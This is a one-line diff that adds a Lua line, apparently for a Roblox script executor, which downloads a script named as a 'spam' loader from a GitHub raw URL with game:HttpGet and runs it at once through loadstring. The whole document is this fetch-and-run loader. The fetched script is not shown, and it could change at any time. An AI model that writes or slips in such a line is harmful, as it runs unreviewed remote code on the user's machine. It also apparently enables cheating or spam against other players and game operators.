@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/beta-buddytime-spam4-djbmwcyllpiow1.lua"))()
